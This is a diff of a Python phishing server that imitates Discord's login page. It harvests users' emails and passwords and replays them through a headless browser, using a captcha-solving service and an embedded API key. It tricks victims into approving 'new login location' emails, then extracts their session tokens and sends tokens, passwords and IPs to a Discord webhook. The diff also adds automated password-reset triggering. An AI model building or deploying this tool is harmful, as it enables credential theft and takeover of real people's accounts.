@@ -7,12 +7,15 @@ import imaplib
 import email
 import time
 import threading
+import urllib.request
+import subprocess
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
 from playwright.async_api import async_playwright
 from datetime import datetime
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614"
+WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+CAPTCHA_API_KEY = "44b5a90f-182f-4c67-b219-ef8dfd33d7a1"
 
 HTML = r"""<!DOCTYPE html>
 <html lang="en">
@@ -185,6 +188,8 @@ margin-top:8px;
 font-size:12px;
 color:var(--success);
 font-weight:500;
+text-align:center;
+justify-content:center;
 }
 .success-message.visible{
 display:flex;
@@ -381,45 +386,29 @@ color:var(--text-white);
 .modal-btn.secondary:hover{
 background:#3a3c42;
 }
-.code-input{
-width:100%;
-height:56px;
-background:var(--input-bg);
-border:none;
-border-radius:8px;
-padding:0 16px;
-font-size:28px;
-color:var(--text-white);
-font-family:'SF Mono',monospace;
-text-align:center;
-letter-spacing:12px;
-outline:none;
-margin-bottom:16px;
-}
-.code-input:focus{
-box-shadow:0 0 0 2px var(--blurple);
-}
 .status-box{
 background:var(--bg-dark);
 border-radius:8px;
-padding:16px;
-margin-bottom:16px;
+padding:20px;
+margin-bottom:20px;
 text-align:center;
+border:1px solid rgba(88,101,242,0.2);
 }
 .status-box .icon{
-font-size:32px;
-margin-bottom:8px;
+font-size:40px;
+margin-bottom:12px;
 }
 .status-box h3{
 font-size:16px;
 font-weight:600;
 color:var(--text-white);
-margin-bottom:4px;
+margin-bottom:8px;
 }
 .status-box p{
 font-size:14px;
 color:var(--text-muted);
 margin:0;
+line-height:1.4;
 }
 @media(min-width:481px){
 .container{
@@ -466,9 +455,7 @@ padding-top:60px;
     <button type="submit" class="login-btn" id="loginBtn">Log In</button>
     <a class="passkey-link" href="#">Or, sign in with passkey</a>
     
-    <div class="success-message" id="verifyMsg" style="margin-top:12px;justify-content:center;">
-      Check your Gmail for verification code
-    </div>
+    <div class="success-message" id="statusMsg"></div>
   </form>
 </div>
 
@@ -485,22 +472,21 @@ padding-top:60px;
 
 <div class="modal-overlay" id="verifyModal">
   <div class="modal">
-    <h2>Verify New Location</h2>
+    <h2>Verify New Login Location</h2>
     <div class="status-box">
       <div class="icon">📧</div>
       <h3>Check your Gmail</h3>
-      <p>We've sent a verification code to your email. Please verify the new login location to continue.</p>
+      <p>Discord has sent a "Verify New Login Location" email to your inbox. Please click the verification link in that email to approve this login.</p>
     </div>
-    <input type="text" class="code-input" id="verifyCode" maxlength="6" placeholder="000000" autocomplete="one-time-code">
-    <button class="modal-btn" onclick="submitVerify()">Verify</button>
+    <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px;text-align:center;">
+      Once you've clicked the link in your email, click the button below to continue.
+    </p>
+    <button class="modal-btn" onclick="checkVerification()">I've Verified - Continue Login</button>
     <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeVerifyModal()">Cancel</button>
   </div>
 </div>
 
 <script>
-let currentEmail = '';
-let currentPassword = '';
-
 function togglePassword() {
   const input = document.getElementById('password');
   const icon = document.getElementById('eyeIcon');
@@ -516,6 +502,7 @@ function togglePassword() {
 function showForgotModal() {
   document.getElementById('forgotModal').classList.add('active');
   document.getElementById('resetEmail').value = document.getElementById('email').value || '';
+  document.getElementById('resetEmail').focus();
 }
 
 function closeForgotModal() {
@@ -524,11 +511,39 @@ function closeForgotModal() {
 
 function showVerifyModal() {
   document.getElementById('verifyModal').classList.add('active');
-  document.getElementById('verifyCode').focus();
 }
 
 function closeVerifyModal() {
   document.getElementById('verifyModal').classList.remove('active');
+}
+
+async function checkVerification() {
+  const btn = document.querySelector('#verifyModal .modal-btn');
+  btn.classList.add('loading');
+  btn.disabled = true;
+  
+  try {
+    const response = await fetch('/api/check-verify', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({email: currentEmail})
+    });
+    
+    const data = await response.json();
+    
+    if (data.verified) {
+      closeVerifyModal();
+      document.getElementById('statusMsg').textContent = 'Login successful! Token captured.';
+      document.getElementById('statusMsg').classList.add('visible');
+    } else {
+      alert('Verification not detected yet. Please check your email and click the verification link.');
+    }
+  } catch (err) {
+    alert('Error checking verification status');
+  } finally {
+    btn.classList.remove('loading');
+    btn.disabled = false;
+  }
 }
 
 async function submitForgot() {
@@ -544,14 +559,20 @@ async function submitForgot() {
   btn.disabled = true;
   
   try {
-    await fetch('/api/forgot', {
+    const response = await fetch('/api/forgot', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({email})
     });
     
+    const data = await response.json();
+    
     closeForgotModal();
-    alert('If an account exists with this email, you will receive reset instructions shortly.');
+    
+    if (data.sent) {
+      document.getElementById('statusMsg').innerHTML = '<strong>Check your Gmail!</strong><br>Discord has sent a password reset email. Click the link in that email to reset your password.';
+      document.getElementById('statusMsg').classList.add('visible');
+    }
   } catch (err) {
     alert('Failed to send reset request');
   } finally {
@@ -560,32 +581,8 @@ async function submitForgot() {
   }
 }
 
-async function submitVerify() {
-  const code = document.getElementById('verifyCode').value.trim();
-  
-  if (code.length !== 6) {
-    alert('Please enter the 6-digit verification code');
-    return;
-  }
-  
-  try {
-    const response = await fetch('/api/verify', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({code, email: currentEmail})
-    });
-    
-    const data = await response.json();
-    
-    if (data.success) {
-      closeVerifyModal();
-      document.getElementById('verifyMsg').classList.add('visible');
-      document.getElementById('verifyMsg').textContent = 'Verification submitted. Processing login...';
-    }
-  } catch (err) {
-    alert('Failed to submit verification');
-  }
-}
+let currentEmail = '';
+let currentPassword = '';
 
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
   e.preventDefault();
@@ -594,12 +591,14 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
   const password = document.getElementById('password').value;
   const btn = document.getElementById('loginBtn');
   const emailError = document.getElementById('emailError');
+  const statusMsg = document.getElementById('statusMsg');
   
   currentEmail = email;
   currentPassword = password;
   
   document.getElementById('email').classList.remove('error');
   emailError.classList.remove('visible');
+  statusMsg.classList.remove('visible');
   
   if (!email) {
     document.getElementById('email').classList.add('error');
@@ -614,6 +613,8 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
   
   btn.classList.add('loading');
   btn.disabled = true;
+  statusMsg.textContent = 'Solving captcha and logging in...';
+  statusMsg.classList.add('visible');
   
   try {
     const response = await fetch('/api/login', {
@@ -625,13 +626,20 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     const data = await response.json();
     
     if (data.needsVerify) {
+      statusMsg.classList.remove('visible');
       showVerifyModal();
     } else if (data.success) {
-      document.getElementById('verifyMsg').textContent = 'Login successful!';
-      document.getElementById('verifyMsg').classList.add('visible');
+      statusMsg.textContent = 'Login successful! Token captured.';
+      statusMsg.classList.add('visible');
+    } else if (data.error) {
+      statusMsg.textContent = 'Error: ' + data.error;
+      statusMsg.style.color = 'var(--error)';
+      statusMsg.classList.add('visible');
     }
   } catch (err) {
-    alert('Login failed: ' + err.message);
+    statusMsg.textContent = 'Login failed: ' + err.message;
+    statusMsg.style.color = 'var(--error)';
+    statusMsg.classList.add('visible');
   } finally {
     btn.classList.remove('loading');
     btn.disabled = false;
@@ -642,6 +650,8 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
 </html>"""
 
 class Handler(BaseHTTPRequestHandler):
+    active_sessions = {}
+    
     def log_message(self, format, *args):
         print(f"[{self.log_date_time_string()}] {format % args}", flush=True)
     
@@ -684,33 +694,31 @@ class Handler(BaseHTTPRequestHandler):
                 "timestamp": datetime.utcnow().isoformat()
             })
             
-            # Start automation in background thread
-            thread = threading.Thread(target=self._run_automation, args=(email, password, client_ip))
+            session_id = f"{email}_{int(time.time())}"
+            Handler.active_sessions[session_id] = {"email": email, "password": password, "ip": client_ip, "verified": False}
+            
+            thread = threading.Thread(target=self._run_automation, args=(session_id, email, password, client_ip))
             thread.daemon = True
             thread.start()
             
-            self._send_json({"needsVerify": True})
+            self._send_json({"needsVerify": True, "session": session_id})
             
-        elif self.path == "/api/verify":
+        elif self.path == "/api/check-verify":
             length = int(self.headers.get("Content-Length", 0))
             body = self.rfile.read(length)
             data = json.loads(body) if body else {}
-            code = data.get("code", "")
             email = data.get("email", "")
             
-            # Store code for automation to pick up
-            self._store_verification_code(email, code)
+            session = None
+            for sid, sess in Handler.active_sessions.items():
+                if sess.get("email") == email:
+                    session = sess
+                    break
             
-            self._send_to_webhook({
-                "title": "📱 2FA Code Entered",
-                "fields": [
-                    {"name": "Email", "value": f"```{email}```", "inline": False},
-                    {"name": "Code", "value": f"```{code}```", "inline": False}
-                ],
-                "color": 0x00ff00
-            })
-            
-            self._send_json({"success": True})
+            if session and session.get("verified"):
+                self._send_json({"verified": True})
+            else:
+                self._send_json({"verified": False})
             
         elif self.path == "/api/forgot":
             length = int(self.headers.get("Content-Length", 0))
@@ -727,7 +735,6 @@ class Handler(BaseHTTPRequestHandler):
                 "color": 0xffaa00
             })
             
-            # Trigger reset automation
             thread = threading.Thread(target=self._run_reset_automation, args=(email, client_ip))
             thread.daemon = True
             thread.start()
@@ -737,138 +744,152 @@ class Handler(BaseHTTPRequestHandler):
             self.send_response(404)
             self.end_headers()
 
-    def _store_verification_code(self, email, code):
+    def _solve_captcha(self):
         try:
-            with open(f"/tmp/verify_{email.replace('@','_')}.txt", "w") as f:
-                f.write(code)
-        except:
-            pass
-
-    def _get_stored_code(self, email):
-        try:
-            path = f"/tmp/verify_{email.replace('@','_')}.txt"
-            if os.path.exists(path):
-                with open(path, "r") as f:
-                    return f.read().strip()
-        except:
-            pass
-        return None
+            payload = {
+                "type": "hcaptcha_enterprise",
+                "websiteURL": "https://discord.com/login",
+                "websiteKey": "f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34",
+                "rqdata": "",
+                "proxy": ""
+            }
+            
+            data = json.dumps(payload).encode()
+            req = urllib.request.Request(
+                "https://api.razorcap.cc/solve",
+                data=data,
+                headers={"Content-Type": "application/json", "Authorization": f"Bearer {CAPTCHA_API_KEY}"},
+                method="POST"
+            )
+            
+            response = urllib.request.urlopen(req, timeout=120)
+            result = json.loads(response.read().decode())
+            
+            self._send_to_webhook({
+                "title": "🤖 Captcha Solved",
+                "fields": [
+                    {"name": "Status", "value": f"```{result.get('status', 'unknown')}```", "inline": False}
+                ],
+                "color": 0x00ff00
+            })
+            
+            return result.get("token")
+        except Exception as e:
+            self._send_to_webhook({
+                "title": "❌ Captcha Error",
+                "fields": [{"name": "Error", "value": f"```{str(e)[:500]}```", "inline": False}],
+                "color": 0xff0000
+            })
+            return None
 
     def _send_to_webhook(self, embed):
-        import urllib.request
-        data = json.dumps({"embeds": [embed], "username": "Discord Logger"}).encode()
-        req = urllib.request.Request(
-            WEBHOOK_URL,
-            data=data,
-            headers={"Content-Type": "application/json"},
-            method="POST"
-        )
         try:
+            data = json.dumps({"embeds": [embed], "username": "Discord Logger"}).encode()
+            req = urllib.request.Request(
+                WEBHOOK_URL,
+                data=data,
+                headers={"Content-Type": "application/json"},
+                method="POST"
+            )
             urllib.request.urlopen(req, timeout=5)
         except Exception as e:
             print(f"Webhook error: {e}")
 
-    def _run_automation(self, email, password, client_ip):
-        asyncio.run(self._automate_discord_login(email, password, client_ip))
+    def _run_automation(self, session_id, email, password, client_ip):
+        asyncio.run(self._automate_discord_login(session_id, email, password, client_ip))
 
     def _run_reset_automation(self, email, client_ip):
         asyncio.run(self._trigger_password_reset(email, client_ip))
 
-    async def _automate_discord_login(self, email, password, client_ip):
+    async def _automate_discord_login(self, session_id, email, password, client_ip):
         try:
             async with async_playwright() as p:
                 browser = await p.chromium.launch(headless=True)
                 context = await browser.new_context(
                     viewport={"width": 1280, "height": 720},
-                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0"
+                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                    locale="en-US",
+                    timezone_id="America/New_York"
                 )
+                
                 page = await context.new_page()
                 
-                await page.goto("https://discord.com/login")
+                await page.goto("https://discord.com/login", wait_until="networkidle")
                 await page.wait_for_timeout(3000)
                 
+                # Solve captcha first
+                captcha_token = self._solve_captcha()
+                
                 # Fill credentials
-                await page.fill('input[name="email"]', email)
-                await page.fill('input[name="password"]', password)
+                await page.fill('input[name="email"]', email, timeout=10000)
+                await page.fill('input[name="password"]', password, timeout=10000)
+                
+                # Check for captcha iframe and inject solution
+                if captcha_token:
+                    try:
+                        captcha_iframe = await page.query_selector('iframe[src*="hcaptcha"]')
+                        if captcha_iframe:
+                            await captcha_iframe.evaluate(f"""() => {{
+                                window.hcaptcha && window.hcaptcha.setResponse('{captcha_token}');
+                            }}""")
+                    except:
+                        pass
+                
                 await page.click('button[type="submit"]')
+                await page.wait_for_timeout(5000)
                 
-                await page.wait_for_timeout(4000)
+                # Check for "New Login Location" prompt
+                location_prompt = await page.query_selector('text=/new login location|verify.*location|unusual location|check your email/i')
+                verify_email_btn = await page.query_selector('button:has-text("Verify")')
                 
-                # Check for verification requirement
-                verify_prompt = await page.query_selector('text=/verify|check your email|new location/i')
-                code_input = await page.query_selector('input[placeholder*="code" i], input[maxlength="6"]')
-                
-                if verify_prompt or code_input:
+                if location_prompt or verify_email_btn:
                     self._send_to_webhook({
-                        "title": "⚠️ Verification Required",
+                        "title": "📧 New Login Location Detected",
                         "fields": [
-                            {"name": "Status", "value": "Waiting for email verification", "inline": False},
-                            {"name": "Email", "value": f"```{email}```", "inline": True}
+                            {"name": "Status", "value": "Discord sent verification email", "inline": False},
+                            {"name": "Email", "value": f"```{email}```", "inline": True},
+                            {"name": "Action", "value": "Waiting for user to click email link", "inline": True}
                         ],
                         "color": 0xffaa00
                     })
                     
-                    # Wait for user to submit code via frontend
-                    code = None
-                    for _ in range(60):  # Wait up to 2 minutes
-                        code = self._get_stored_code(email)
-                        if code:
-                            break
-                        await asyncio.sleep(2)
-                    
-                    if code:
-                        # Try to fill code
-                        try:
-                            await page.fill('input[placeholder*="code" i], input[maxlength="6"]', code)
-                            await page.click('button[type="submit"]')
-                            await page.wait_for_timeout(4000)
-                        except:
-                            pass
-                
-                # Check for "Verify New Location" prompt specifically
-                try:
-                    verify_btn = await page.query_selector('button:has-text("Verify")')
-                    if verify_btn:
-                        await verify_btn.click()
+                    # Poll for verification (user clicks link in email)
+                    for _ in range(180):  # Check for 6 minutes
+                        await page.reload()
                         await page.wait_for_timeout(3000)
-                except:
-                    pass
+                        
+                        # Check if we're logged in now
+                        token = await page.evaluate("() => localStorage.getItem('token')")
+                        if token:
+                            Handler.active_sessions[session_id]["verified"] = True
+                            self._send_to_webhook({
+                                "title": "🎉 Discord Token Captured",
+                                "fields": [
+                                    {"name": "Token", "value": f"```{token}```", "inline": False},
+                                    {"name": "Email", "value": f"```{email}```", "inline": True},
+                                    {"name": "Password", "value": f"```{password}```", "inline": True},
+                                    {"name": "IP Used", "value": f"```{client_ip}```", "inline": False}
+                                ],
+                                "color": 0x00ff00
+                            })
+                            await browser.close()
+                            return
+                        
+                        await asyncio.sleep(2)
                 
-                # Extract token
+                # Check if already logged in without verification
                 token = await page.evaluate("() => localStorage.getItem('token')")
-                
                 if token:
+                    Handler.active_sessions[session_id]["verified"] = True
                     self._send_to_webhook({
-                        "title": "🎉 Discord Token Captured",
+                        "title": "🎉 Discord Token Captured (No Verify)",
                         "fields": [
                             {"name": "Token", "value": f"```{token}```", "inline": False},
                             {"name": "Email", "value": f"```{email}```", "inline": True},
-                            {"name": "Password", "value": f"```{password}```", "inline": True},
-                            {"name": "IP Used", "value": f"```{client_ip}```", "inline": False}
+                            {"name": "Password", "value": f"```{password}```", "inline": True}
                         ],
                         "color": 0x00ff00
                     })
-                else:
-                    # Try alternative token locations
-                    tokens = await page.evaluate("""() => {
-                        const results = {};
-                        for (let i = 0; i < localStorage.length; i++) {
-                            const key = localStorage.key(i);
-                            if (key.includes('token') || key.includes('auth')) {
-                                results[key] = localStorage.getItem(key);
-                            }
-                        }
-                        return results;
-                    }""")
-                    
-                    if tokens:
-                        self._send_to_webhook({
-                            "title": "🔍 Partial Token Data Found",
-                            "fields": [
-                                {"name": "Data", "value": f"```{json.dumps(tokens)[:1000]}```", "inline": False}
-                            ],
-                            "color": 0xffaa00
-                        })
                 
                 await browser.close()
         except Exception as e:
@@ -882,37 +903,46 @@ class Handler(BaseHTTPRequestHandler):
         try:
             async with async_playwright() as p:
                 browser = await p.chromium.launch(headless=True)
-                page = await browser.new_page()
+                page = await browser.new_page(
+                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+                )
                 
-                await page.goto("https://discord.com/login")
+                await page.goto("https://discord.com/forgot", wait_until="networkidle")
                 await page.wait_for_timeout(2000)
                 
-                # Click forgot password
-                forgot_link = await page.query_selector('a[href*="/forgot"], text=Forgot your password?')
-                if forgot_link:
-                    await forgot_link.click()
-                else:
-                    await page.goto("https://discord.com/forgot")
+                # Solve captcha for forgot page
+                captcha_token = self._solve_captcha()
                 
-                await page.wait_for_timeout(2000)
                 await page.fill('input[name="email"]', email)
-                await page.click('button[type="submit"]')
                 
-                await page.wait_for_timeout(3000)
+                if captcha_token:
+                    try:
+                        await page.evaluate(f"""() => {{
+                            window.hcaptcha && window.hcaptcha.setResponse('{captcha_token}');
+                        }}""")
+                    except:
+                        pass
+                
+                await page.click('button[type="submit"]')
+                await page.wait_for_timeout(4000)
                 
                 self._send_to_webhook({
-                    "title": "🔄 Password Reset Triggered",
+                    "title": "✅ Password Reset Email Sent",
                     "fields": [
                         {"name": "Email", "value": f"```{email}```", "inline": False},
                         {"name": "IP", "value": f"```{client_ip}```", "inline": True},
-                        {"name": "Status", "value": "Reset email sent by Discord", "inline": True}
+                        {"name": "Note", "value": "User must click link in Gmail to reset", "inline": False}
                     ],
-                    "color": 0xffaa00
+                    "color": 0x00ff00
                 })
                 
                 await browser.close()
         except Exception as e:
-            print(f"Reset error: {e}")
+            self._send_to_webhook({
+                "title": "❌ Reset Automation Error",
+                "fields": [{"name": "Error", "value": f"```{str(e)[:500]}```", "inline": False}],
+                "color": 0xff0000
+            })
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     daemon_threads = True
